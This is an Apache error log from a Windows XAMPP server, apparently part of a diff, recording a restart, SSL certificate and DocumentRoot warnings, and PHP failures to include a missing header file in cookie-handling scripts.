+[Mon Oct 24 11:42:56.962741 2022] [mpm_winnt:notice] [pid 1952:tid 256] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Mon Oct 24 11:42:58.963603 2022] [mpm_winnt:notice] [pid 2584:tid 268] AH00364: Child: All worker threads have exited.
+[Mon Oct 24 11:42:59.057347 2022] [mpm_winnt:notice] [pid 1952:tid 256] AH00430: Parent: Child process 2584 exited successfully.
+[Mon Oct 24 11:43:20.593216 2022] [ssl:warn] [pid 1996:tid 256] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+AH00112: Warning: DocumentRoot [C:/xampp/htdocs/wiki/] does not exist
+AH00112: Warning: DocumentRoot [C:/xampp/htdocs/wp] does not exist
+[Mon Oct 24 11:43:20.624464 2022] [ssl:warn] [pid 1996:tid 256] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Mon Oct 24 11:43:20.640088 2022] [mpm_winnt:notice] [pid 1996:tid 256] AH00455: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.11 configured -- resuming normal operations
+[Mon Oct 24 11:43:20.640088 2022] [mpm_winnt:notice] [pid 1996:tid 256] AH00456: Apache Lounge VC15 Server built: Aug 11 2019 12:20:04
+[Mon Oct 24 11:43:20.640088 2022] [core:notice] [pid 1996:tid 256] AH00094: Command line: 'c:\\xampp\\apache\\bin\\httpd.exe -d C:/xampp/apache'
+[Mon Oct 24 11:43:20.640088 2022] [mpm_winnt:notice] [pid 1996:tid 256] AH00418: Parent: Created child process 2232
+AH00112: Warning: DocumentRoot [C:/xampp/htdocs/wiki/] does not exist
+AH00112: Warning: DocumentRoot [C:/xampp/htdocs/wp] does not exist
+[Mon Oct 24 11:43:20.811953 2022] [ssl:warn] [pid 2232:tid 268] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+AH00112: Warning: DocumentRoot [C:/xampp/htdocs/wiki/] does not exist
+AH00112: Warning: DocumentRoot [C:/xampp/htdocs/wp] does not exist
+[Mon Oct 24 11:43:20.827577 2022] [ssl:warn] [pid 2232:tid 268] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Mon Oct 24 11:43:20.843202 2022] [mpm_winnt:notice] [pid 2232:tid 268] AH00354: Child: Starting 150 worker threads.
+[Mon Oct 24 11:43:25.491371 2022] [php7:notice] [pid 2232:tid 1548] [client 174.7.108.139:1923] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Oct 24 11:43:25.491371 2022] [php7:notice] [pid 2232:tid 1548] [client 174.7.108.139:1923] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Oct 24 11:43:25.491371 2022] [php7:notice] [pid 2232:tid 1548] [client 174.7.108.139:1923] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Oct 24 11:43:25.506995 2022] [php7:notice] [pid 2232:tid 1548] [client 174.7.108.139:1923] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Oct 24 11:43:25.506995 2022] [php7:notice] [pid 2232:tid 1548] [client 174.7.108.139:1923] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Oct 24 11:43:25.506995 2022] [php7:notice] [pid 2232:tid 1548] [client 174.7.108.139:1923] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Oct 24 11:43:30.585804 2022] [php7:notice] [pid 2232:tid 1548] [client 174.7.108.139:1923] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Oct 24 11:43:30.585804 2022] [php7:notice] [pid 2232:tid 1548] [client 174.7.108.139:1923] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Oct 24 11:43:30.585804 2022] [php7:notice] [pid 2232:tid 1548] [client 174.7.108.139:1923] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Oct 24 11:43:30.585804 2022] [php7:notice] [pid 2232:tid 1548] [client 174.7.108.139:1923] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Oct 24 11:43:30.585804 2022] [php7:notice] [pid 2232:tid 1548] [client 174.7.108.139:1923] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Oct 24 11:43:30.585804 2022] [php7:notice] [pid 2232:tid 1548] [client 174.7.108.139:1923] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
